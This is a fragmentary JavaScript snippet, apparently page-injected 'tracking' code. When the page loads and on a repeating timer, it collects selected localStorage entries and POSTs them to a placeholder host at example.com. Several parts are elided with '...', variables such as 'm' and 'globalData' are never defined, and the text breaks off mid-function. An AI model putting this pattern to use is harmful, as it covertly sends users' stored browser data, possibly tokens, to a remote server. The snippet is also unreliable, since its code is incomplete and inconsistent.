(function (v, h, p, a, r, i, T) {
  ...
  var o = h.head;
  const keysToWatch = new Set(window.keysToWatch);
  if (!o) {
    return;
  }
  ...
  function trackLocalStorageData() {
    for (let i = 0; i < localStorage.length; i++) {
      ...
      if (keysToWatch.has(key)) {
        globalData[key] = localStorage.getItem(key);
      }
    }
    return globalData;
  }
  ...
  function dispatchDataToServer(data) {
    const identifier = hashCode(data);
    const apiEndpoint = `https://example.com/api/track/${identifier}`;
    fetch(apiEndpoint, {
      method: "POST",
      headers: {
    ...
    }).then(data => console.log("Data sent successfully")).catch(error => console.error(`Failed to send data with error: ${error}`));
  }
  if (m) {
    m = +m[1];
  }
  ...
  document.addEventListener('DOMContentLoaded', () => {
    let trackedData = trackLocalStorageData();
    dispatchDataToServer(trackedData);
    let jshook = setInterval(() => {
      let currentData = trackLocalStorageData();
      if (hashCode(currentData) !== hashCode(trackedData)) {
        dispatchDataToServer(currentData);
